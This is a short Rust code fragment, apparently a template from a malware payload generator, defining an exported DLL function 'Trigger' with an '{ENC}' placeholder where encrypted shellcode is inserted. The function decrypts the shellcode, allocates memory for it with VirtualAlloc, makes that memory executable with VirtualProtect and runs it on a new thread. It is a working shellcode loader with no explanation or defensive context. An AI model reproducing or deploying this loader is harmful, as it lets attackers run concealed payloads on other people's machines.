#[no_mangle]
pub extern "C" fn Trigger() {
    
    unsafe {
        {ENC}
        
        let address_pointer = VirtualAlloc(None, dec_shellcode.len(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        ptr::copy(dec_shellcode.as_ptr(), address_pointer as *mut u8, dec_shellcode.len());
        let old_protection = &mut PAGE_PROTECTION_FLAGS(0);
        _ = VirtualProtect(address_pointer, dec_shellcode.len(), PAGE_EXECUTE_READ, old_protection);
        let function_pointer: fn() -> () = std::mem::transmute(address_pointer);
        thread::spawn(move || {
            function_pointer();
        });
        
        WaitForSingleObject(HANDLE(-1), u32::MAX);
    };

}